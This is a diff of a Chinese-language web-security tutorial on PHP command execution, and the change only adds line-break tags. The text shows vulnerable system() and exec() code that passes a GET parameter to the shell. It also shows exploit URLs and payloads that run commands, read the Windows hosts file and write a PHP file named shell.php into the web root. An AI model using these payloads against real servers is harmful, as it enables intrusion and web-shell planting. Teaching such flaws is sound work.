@@ -15,9 +15,9 @@ if(isset($_GET[‘cmd’])){
 ?>
 ```
 利用方式：提交URL，并且构造想输入的命令到参数里面。</br>
-URL：http://192.168.11.11/system.php?cmd=ipconfig
-（2）exec()函数典型代码及利用
-exec.php文件代码内容：
+URL：http://192.168.11.11/system.php?cmd=ipconfig</br>
+（2）exec()函数典型代码及利用</br>
+exec.php文件代码内容：</br>
 ```php
 <?php
 if(isset($_GET[‘cmd’])){
@@ -27,13 +27,13 @@ if(isset($_GET[‘cmd’])){
 ?>
 ```
 利用方式：提交URL，并且构造想输入的命令到参数里面。</br>
-URL：http://192.168.11.11/exec.php?cmd=whoami
-（3）查看系统文件
+URL：http://192.168.11.11/exec.php?cmd=whoami</br>
+（3）查看系统文件</br>
 payload：
 ```
 ?cmd=type c:\windows\system32\drivers\etc\hosts      (查看系统hosts文件)
 ```
-（4）写文件
+（4）写文件</br>
 payload：
 ```
 ?cmd=echo “<?php phpinfo();?>” > c:\phpStudy\WWW\Command\shell.php
